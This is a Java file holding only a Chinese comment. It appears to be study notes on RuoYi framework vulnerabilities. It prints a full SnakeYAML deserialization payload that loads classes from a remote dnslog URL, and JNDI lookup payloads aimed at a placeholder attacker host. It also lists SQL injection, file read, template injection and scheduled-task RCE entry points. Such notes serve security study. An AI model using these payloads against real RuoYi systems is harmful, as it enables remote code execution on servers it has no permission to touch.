package summary.security.fuxian.若依;

public class Summary1 {
    /**
     * 若依漏洞
     * shiro反序列化（使用了低版本的shiro组件）rememberme 绕过方式
     *
     *  yml反序列化(4.6.2<=Ruoyi<4.7.2)
     *  是payload用了snakeyml: org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://yk5886.dnslog.cn/"]]]]')
     *  也可以用别的方法写payload 这里用snakeyml是因为maven里有snakeyml就直接利用这个snakeyml的反序列化漏洞来写payload
     *  其他payload写法
     *  org.springframework.jndi.JndiLcatorDelegate.lookup('rmi://攻击机/自定义类')
     *  javax.naming.InitialContext.lookup('ldap://攻击机/类')
     *
     *  sql注入:在系统管理的角色管理的查询里
     *  任意文件读取：代码查看下载接口代码
     *  Thymeleaf模板注入
     *  rce:定时任务-添加任务那里 原因就是表单存数据的时候没有做过滤
     *
     *
     */
}
